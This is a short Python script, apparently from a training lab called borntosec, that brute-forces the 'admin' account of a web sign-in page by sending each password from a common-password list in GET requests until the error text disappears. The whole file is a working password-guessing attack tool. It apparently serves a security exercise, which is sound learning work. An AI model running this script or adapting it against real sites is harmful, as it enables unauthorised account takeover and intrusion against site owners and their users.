import requests
import sys

RED = "\033[31m"
DEF = "\033[0m"

target = "http://borntosec.42"
database = "1000-most-common-passwords.txt"

print(f"{RED}Bruteforcing 'admin' on {target}{DEF}")

file = open(database, 'r')

for password in file:
	try:
		password = password.strip()
		test_url = f"{target}/?page=signin&username=admin&password={password}&Login=Login"
		response = requests.get(test_url)
		print(f"Testing '{password}': status {response.status_code}")
		if "WrongAnswer" not in response.text:
			print(f"   --> diff OK\n{RED}'admin' cracked with password '{password}'{DEF}")
			break
		else:
			print("    --> diff KO")
	except KeyboardInterrupt:
		print(f"\n{RED}Exitting...{DEF}")
		sys.exit(0)
